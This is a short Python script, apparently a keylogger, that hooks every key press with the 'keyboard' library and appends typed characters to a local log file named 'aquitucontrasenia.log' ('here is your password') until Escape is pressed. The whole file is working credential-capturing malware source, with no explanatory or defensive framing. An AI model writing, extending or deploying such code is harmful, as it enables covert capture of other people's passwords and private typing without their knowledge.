import keyboard

log_file = "aquitucontrasenia.log"

def on_key_event(event):
    with open(log_file, "a") as f:
        if event.name == 'space':
            f.write(' ')
        if len(event.name) == 1:
            f.write(event.name)
keyboard.on_press(on_key_event)
keyboard.wait('esc')